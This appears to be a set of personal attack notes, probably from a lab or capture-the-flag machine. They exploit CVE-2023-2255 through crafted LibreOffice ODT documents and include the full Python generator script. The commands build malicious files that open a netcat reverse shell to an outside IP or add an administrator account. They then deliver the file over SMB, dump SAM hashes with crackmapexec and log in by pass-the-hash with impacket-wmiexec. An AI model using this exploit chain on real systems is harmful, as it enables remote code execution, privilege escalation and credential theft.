

##
#
https://github.com/elweth-sec/CVE-2023-2255
#
##

```

git clone https://github.com/elweth-sec/CVE-2023-2255

python3 CVE-2023-2255.py --cmd 'nc.exe 10.10.x.x 443 -e sh' --output '../BRUV.odt' 

python3 CVE-2023-2255.py --cmd 'net localgroup ADMINS person /add' --output 'DEATH.odt'



> Start SMB Server
impacket-smbserver target `pass` -smb2support

> copy file to C:\DROPBOX LOL\
net use \\<ip>\target
copy \\<ip>\target\DEATH.odt

> wait for the user to be added to "ADMINS"
net user person

>dump sam hash
crackmapexec smb <box-ip> -u person -p "pass' --sam

> auth with HASHES for a given ADMIN (active)

impacket-wmiexec localadmin@<box-ip> -hashes "<hashes>"

```
GUCCI

##
##


```
import os
import sys
import urllib.parse
import zipfile
import argparse


def main():
    parser = argparse.ArgumentParser(description="CVE-2023-2255")
    parser.add_argument("--cmd", required=True, help="Command to execute")
    parser.add_argument("--output", default="output.odt", help="Output filename")
    args = parser.parse_args()

    with zipfile.ZipFile("./samples/test.odt", "r") as zip_ref:
        zip_ref.extractall("./tmp/")

    content_file = "./tmp/content.xml"
    with open(content_file, "r") as file:
        content = file.read()

    payload = args.cmd.replace(" ", "%20")
    new_content = content.replace("%PAYLOAD%", payload)

    with open(content_file, "w") as file:
        file.write(new_content)

    output_file = args.output
    with zipfile.ZipFile(output_file, "w") as zip_ref:
        for root, _, files in os.walk("./tmp/"):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = file_path.replace("./tmp/", "")
                zip_ref.write(file_path, arcname)

    for root, dirs, files in os.walk("./tmp/", topdown=False):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            os.rmdir(os.path.join(root, dir))
    os.rmdir("./tmp/")

    print(f"File {output_file} has been created !")


if __name__ == "__main__":
    main()
